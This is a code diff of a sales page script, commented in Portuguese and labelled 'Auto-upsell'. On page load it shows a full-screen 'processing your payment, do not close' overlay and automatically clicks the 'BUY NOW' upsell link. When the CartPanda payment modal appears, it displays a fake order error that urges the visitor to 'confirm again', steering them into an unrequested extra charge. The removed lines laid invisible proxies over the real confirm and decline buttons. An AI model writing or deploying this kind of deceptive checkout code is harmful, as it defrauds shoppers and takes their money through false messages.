@@ -15,21 +15,24 @@
             
 	<script>
 	document.addEventListener('DOMContentLoaded', () => {
-	  // 1) Cria overlay full-screen inicial com spinner + mensagens
+	  // --- 1) CSS do overlay, spinner e error message ---
 	  const style = document.createElement('style');
 	  style.innerHTML = `
 		#customOverlay {
-		  position: fixed; top:0; left:0; width:100%; height:100%;
+		  position: fixed; top:0; left:0;
+		  width:100%; height:100%;
 		  background: rgba(255,255,255,0.95);
 		  z-index: 999999;
 		  display: flex; flex-direction: column;
 		  justify-content: center; align-items: center;
 		  text-align: center; font-family: Arial, sans-serif;
+		  pointer-events: auto; /* bloqueia interações no início */
 		}
 		#customOverlay .spinner {
 		  border:8px solid #f3f3f3;
 		  border-top:8px solid #3498db;
-		  border-radius:50%; width:60px; height:60px;
+		  border-radius:50%;
+		  width:60px; height:60px;
 		  animation: spin 1s linear infinite;
 		  margin-bottom:20px;
 		}
@@ -37,83 +40,89 @@
 		#customOverlay .message {
 		  font-size:1.2em; margin:5px 0;
 		}
-		/* container de erro (aparece depois) */
-		#errorContainer { display:none; }
-		#errorContainer .error-msg {
-		  font-size:1.1em; margin-bottom:20px;
+		#customOverlay .error-msg {
+		  position: absolute;
+		  top:20px;
+		  left:50%;
+		  transform: translateX(-50%);
+		  background: #fff;
+		  padding: 12px 20px;
+		  border-radius: 4px;
+		  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+		  pointer-events: none; /* não captura clique */
+		  display: none;
+		  z-index: 1000000;
 		}
 	  `;
 	  document.head.appendChild(style);
 
+	  // --- 2) Cria overlay ---
 	  const overlay = document.createElement('div');
 	  overlay.id = 'customOverlay';
 	  overlay.innerHTML = `
 		<div class="spinner"></div>
 		<div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
 		<div class="message">PROCESSANDO SEU PAGAMENTO</div>
-		<div id="errorContainer">
-		  <div class="error-msg">
-			HOUVE UM ERRO EM SEU PEDIDO,<br>
-			CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-		  </div>
+		<div class="error-msg">
+		  HOUVE UM ERRO EM SEU PEDIDO,<br>
+		  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
 		</div>
 	  `;
 	  document.body.appendChild(overlay);
 
-	  // 2) 1s depois, clica no BUY NOW
+	  // --- 3) Após 1s, dispara BUY NOW ---
 	  setTimeout(() => {
 		const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
 		if (buy) buy.click();
-		else console.warn('Auto-upsell: botão BUY NOW não encontrado');
+		else console.warn('Auto-upsell: BUY NOW não encontrado');
 	  }, 1000);
 
-	  // 3) Quando o modal da CartPanda entrar no DOM, muda a tela para erro
-	  const obs = new MutationObserver((mutations, o) => {
+	  // --- 4) Observa chegada do modal CartPanda ---
+	  const obs = new MutationObserver((mutations, observer) => {
 		for (const m of mutations) {
 		  for (const node of m.addedNodes) {
 			if (node.nodeType===1 &&
 			   (node.id==='cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
-			  
-			  // 3.1) mostra o container de erro e remove spinner/mensagens iniciais
-			  overlay.querySelector('.spinner').style.display = 'none';
-			  overlay.querySelectorAll('.message').forEach(el => el.style.display='none');
-			  const errorBox = overlay.querySelector('#errorContainer');
-			  errorBox.style.display = 'block';
 
-			  // 3.2) posiciona duas divs transparentes sobre os botões reais
-			  const btns = [
-				{ realSel: '#cartpanda-close-modal-btn'     }, // NEGAÇÃO
-				{ realSel: '#cartpanda-payment-confirmation' }  // CONFIRMAÇÃO
-			  ];
-			  btns.forEach(({realSel}, i) => {
-				const real = document.querySelector(realSel);
+			  // 4.1) Esconde spinner/mensagens iniciais e mostra o texto de erro
+			  overlay.querySelector('.spinner').style.display = 'none';
+			  overlay.querySelectorAll('.message').forEach(el => el.style.display = 'none');
+			  const errMsg = overlay.querySelector('.error-msg');
+			  errMsg.style.display = 'block';
+
+			  // 4.2) Agora permite todos os cliques atravessarem
+			  overlay.style.pointerEvents = 'none';
+
+			  // 4.3) Destaca os dois botões da CartPanda com outline
+			  [
+				'#cartpanda-close-modal-btn',          // botão “NÃO, OBRIGADO”
+				'#cartpanda-payment-confirmation'      // botão “SIM, CONFIRMAR”
+			  ].forEach(sel => {
+				const real = document.querySelector(sel);
 				if (!real) return;
 				const r = real.getBoundingClientRect();
-				const proxy = document.createElement('div');
-				// cobre exatamente o botão real
-				Object.assign(proxy.style, {
+				const highlight = document.createElement('div');
+				Object.assign(highlight.style, {
 				  position: 'fixed',
 				  top:    `${r.top}px`,
 				  left:   `${r.left}px`,
 				  width:  `${r.width}px`,
 				  height: `${r.height}px`,
-				  cursor: 'pointer',
-				  zIndex: 1000001,
-				  // para você ver onde estão, pode usar um leve fundo: 
-				  // background: 'rgba(0,0,0,0.1)'
+				  border: '2px dashed #3498db',
+				  borderRadius: '4px',
+				  pointerEvents: 'none',
+				  zIndex: 1000001
 				});
-				// ao clicar, dispara o real
-				proxy.addEventListener('click', () => real.click());
-				overlay.appendChild(proxy);
+				document.body.appendChild(highlight);
 			  });
 
-			  // não precisamos mais observar
-			  o.disconnect();
+			  observer.disconnect();
 			  return;
 			}
 		  }
 		}
 	  });
+
 	  obs.observe(document.body, { childList:true, subtree:true });
 	});
 	</script>
